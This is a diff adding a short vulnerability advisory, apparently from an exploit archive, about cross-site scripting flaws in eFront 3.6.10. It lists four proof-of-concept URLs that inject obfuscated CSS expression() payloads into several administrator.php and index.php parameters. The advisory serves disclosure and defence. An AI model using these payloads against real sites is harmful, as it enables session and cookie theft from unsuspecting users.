@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/50469/info
+
+eFront is prone to multiple cross-site scripting vulnerabilities because the software fails to sufficiently sanitize user-supplied input
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+eFront 3.6.10 build 11944 is vulnerable; other versions may also be affected. 
+
+http://example.com/administrator.php?ctg=%22%20stYle=%22x:expre/**/ssion(alert(9))%20&user=admin&op=dashboard
+
+http://example.com/administrator.php?ctg=personal&user='%20stYle=x:expre/**/ssion(alert(9))%20ns='%20&op=dashboard
+
+http://example.com/administrator.php?ctg=calendar&view_calendar=%22%20stYle=x:expre/**/ssion(alert(9))%20ns=%22
+
+http://example.com/index.php?ctg=lesson_info&lessons_ID=2&course='%20stYle='x:expre/**/ssion(alert(9))
